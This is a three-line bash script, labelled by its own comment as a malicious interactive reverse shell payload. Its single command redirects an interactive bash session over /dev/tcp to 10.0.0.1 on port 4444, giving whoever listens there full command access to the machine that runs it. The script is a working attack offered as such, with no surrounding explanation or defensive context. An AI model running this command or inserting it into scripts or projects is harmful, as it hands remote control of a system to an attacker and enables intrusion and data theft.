#!/bin/bash
# Malicious interactive reverse shell payload
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
